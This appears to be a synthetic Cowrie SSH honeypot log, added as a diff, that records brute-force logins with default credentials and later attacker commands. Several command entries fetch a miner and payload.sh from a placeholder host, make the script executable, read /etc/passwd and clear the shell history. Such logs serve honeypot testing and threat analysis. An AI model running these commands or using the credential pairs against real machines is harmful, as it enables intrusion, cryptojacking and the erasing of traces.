@@ -1,0 +1,49 @@
+{"eventid": "cowrie.session.connect", "src_ip": "45.155.204.18", "session": "3e111fef19d1481c", "timestamp": "2026-08-10T15:55:08.258919Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.204.18", "session": "3e111fef19d1481c", "timestamp": "2026-08-10T15:55:10.028442Z", "username": "pi", "password": "raspberry"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.204.18", "session": "3e111fef19d1481c", "timestamp": "2026-08-10T15:55:11.404385Z", "username": "root", "password": "root"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.204.18", "session": "3e111fef19d1481c", "timestamp": "2026-08-10T15:55:11.947383Z", "username": "user", "password": "password"}
+{"eventid": "cowrie.session.closed", "src_ip": "45.155.204.18", "session": "3e111fef19d1481c", "timestamp": "2026-08-10T15:55:12.350723Z", "duration": 13}
+{"eventid": "cowrie.session.connect", "src_ip": "103.145.13.77", "session": "dd5407fd9f3d4ea6", "timestamp": "2026-08-11T00:00:52.226196Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "103.145.13.77", "session": "dd5407fd9f3d4ea6", "timestamp": "2026-08-11T00:00:53.522519Z", "username": "guest", "password": "guest"}
+{"eventid": "cowrie.login.failed", "src_ip": "103.145.13.77", "session": "dd5407fd9f3d4ea6", "timestamp": "2026-08-11T00:00:53.827903Z", "username": "user", "password": "password"}
+{"eventid": "cowrie.session.closed", "src_ip": "103.145.13.77", "session": "dd5407fd9f3d4ea6", "timestamp": "2026-08-11T00:00:54.922193Z", "duration": 208}
+{"eventid": "cowrie.session.connect", "src_ip": "185.220.101.45", "session": "cffe9322a28b45f9", "timestamp": "2026-08-11T06:27:10.446307Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "185.220.101.45", "session": "cffe9322a28b45f9", "timestamp": "2026-08-11T06:27:11.260554Z", "username": "pi", "password": "raspberry"}
+{"eventid": "cowrie.login.failed", "src_ip": "185.220.101.45", "session": "cffe9322a28b45f9", "timestamp": "2026-08-11T06:27:12.426606Z", "username": "ubuntu", "password": "ubuntu"}
+{"eventid": "cowrie.session.closed", "src_ip": "185.220.101.45", "session": "cffe9322a28b45f9", "timestamp": "2026-08-11T06:27:13.108725Z", "duration": 114}
+{"eventid": "cowrie.session.connect", "src_ip": "62.171.178.4", "session": "b2e0a35451434682", "timestamp": "2026-08-11T09:08:07.272325Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "62.171.178.4", "session": "b2e0a35451434682", "timestamp": "2026-08-11T09:08:09.120801Z", "username": "guest", "password": "guest"}
+{"eventid": "cowrie.login.failed", "src_ip": "62.171.178.4", "session": "b2e0a35451434682", "timestamp": "2026-08-11T09:08:10.119144Z", "username": "root", "password": "toor"}
+{"eventid": "cowrie.session.closed", "src_ip": "62.171.178.4", "session": "b2e0a35451434682", "timestamp": "2026-08-11T09:08:11.105769Z", "duration": 161}
+{"eventid": "cowrie.session.connect", "src_ip": "141.98.11.62", "session": "9c38e22e9469475b", "timestamp": "2026-08-11T18:04:41.505254Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "141.98.11.62", "session": "9c38e22e9469475b", "timestamp": "2026-08-11T18:04:42.334935Z", "username": "admin", "password": "admin"}
+{"eventid": "cowrie.login.failed", "src_ip": "141.98.11.62", "session": "9c38e22e9469475b", "timestamp": "2026-08-11T18:04:43.741460Z", "username": "guest", "password": "guest"}
+{"eventid": "cowrie.session.closed", "src_ip": "141.98.11.62", "session": "9c38e22e9469475b", "timestamp": "2026-08-11T18:04:45.085118Z", "duration": 84}
+{"eventid": "cowrie.session.connect", "src_ip": "62.171.178.4", "session": "569f4da5a34048be", "timestamp": "2026-08-11T22:45:57.341198Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "62.171.178.4", "session": "569f4da5a34048be", "timestamp": "2026-08-11T22:45:58.068744Z", "username": "user", "password": "password"}
+{"eventid": "cowrie.login.failed", "src_ip": "62.171.178.4", "session": "569f4da5a34048be", "timestamp": "2026-08-11T22:45:58.674976Z", "username": "admin", "password": "admin123"}
+{"eventid": "cowrie.session.closed", "src_ip": "62.171.178.4", "session": "569f4da5a34048be", "timestamp": "2026-08-11T22:45:59.263333Z", "duration": 260}
+{"eventid": "cowrie.session.connect", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:09.638014Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:10.290991Z", "username": "root", "password": "root"}
+{"eventid": "cowrie.login.failed", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:11.294788Z", "username": "guest", "password": "guest"}
+{"eventid": "cowrie.login.success", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:11.969004Z", "username": "test", "password": "test"}
+{"eventid": "cowrie.command.input", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:14.538989Z", "input": "whoami"}
+{"eventid": "cowrie.command.input", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:15.159546Z", "input": "ls -la"}
+{"eventid": "cowrie.session.closed", "src_ip": "194.35.121.9", "session": "c57eda41ebd3425d", "timestamp": "2026-08-11T23:02:16.202198Z", "duration": 75}
+{"eventid": "cowrie.session.connect", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:51.270840Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:52.334081Z", "username": "ubuntu", "password": "ubuntu"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:53.244591Z", "username": "root", "password": "123456"}
+{"eventid": "cowrie.login.success", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:54.452979Z", "username": "user", "password": "password"}
+{"eventid": "cowrie.command.input", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:56.679278Z", "input": "curl -O http://malicious-example.test/miner"}
+{"eventid": "cowrie.command.input", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:58.122878Z", "input": "cat /etc/passwd"}
+{"eventid": "cowrie.session.closed", "src_ip": "45.155.204.18", "session": "0d96e63e49064320", "timestamp": "2026-08-12T04:33:59.984707Z", "duration": 34}
+{"eventid": "cowrie.session.connect", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:38.181657Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:39.847015Z", "username": "oracle", "password": "oracle"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:41.328062Z", "username": "root", "password": "root"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:42.245818Z", "username": "test", "password": "test"}
+{"eventid": "cowrie.login.success", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:43.365430Z", "username": "admin", "password": "admin123"}
+{"eventid": "cowrie.command.input", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:46.048439Z", "input": "chmod +x payload.sh"}
+{"eventid": "cowrie.command.input", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:48.015159Z", "input": "ps aux"}
+{"eventid": "cowrie.command.input", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:49.423125Z", "input": "history -c"}
+{"eventid": "cowrie.command.input", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:49.970218Z", "input": "wget http://malicious-example.test/payload.sh"}
+{"eventid": "cowrie.session.closed", "src_ip": "89.248.165.32", "session": "8dbb9d4c4594483b", "timestamp": "2026-08-12T07:59:50.630890Z", "duration": 247}
